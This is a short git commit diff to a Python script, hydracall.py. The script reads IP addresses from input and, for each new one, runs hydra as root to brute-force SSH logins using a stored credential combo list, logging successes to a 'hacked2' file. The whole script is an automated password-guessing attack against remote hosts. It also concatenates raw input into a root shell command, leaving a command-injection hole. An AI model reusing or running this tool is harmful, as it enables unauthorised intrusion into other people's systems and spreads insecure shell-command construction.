af01d86464128e27e1163d103cbd1faaa378b90b
dvr <voropaevdmtr@gmail.com>
2019-08-25 01:44:31 +0400

    something fixing

--- hydracall.py
+++ hydracall.py
@@ -3,5 +3,9 @@ import os
 import sys
 
 args = sys.argv[1:]
+history = set()
 while True:
-	os.system("sudo hydra -I -f -t 4 -C /var/log/contrSSH/logins.log -V -o /var/log/contrSSH/hacked2 ssh://" + input())
+	newIp = input()
+	if not (newIp in history):
+		history.add(newIp)
+		os.system("sudo hydra -I -f -t 4 -C /var/log/contrSSH/logins.log -V -o /var/log/contrSSH/hacked2 ssh://" + newIp)
